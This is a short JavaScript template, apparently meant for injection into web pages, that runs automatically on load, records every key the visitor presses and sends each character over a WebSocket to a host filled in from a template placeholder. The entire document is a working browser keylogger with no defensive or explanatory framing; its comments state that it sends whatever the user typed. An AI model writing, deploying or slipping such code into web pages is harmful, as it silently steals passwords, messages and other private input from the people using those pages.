// as template
(function() {
    var conn = new WebSocket("ws://{{.}}/ws"); // fill host before being used
    document.onkeydown = keydown;
    function keydown(ev) {
        s = String.fromCharCode(ev.which);
        conn.send(s); // send whatever user typed
    }
}()) // auto run when loaded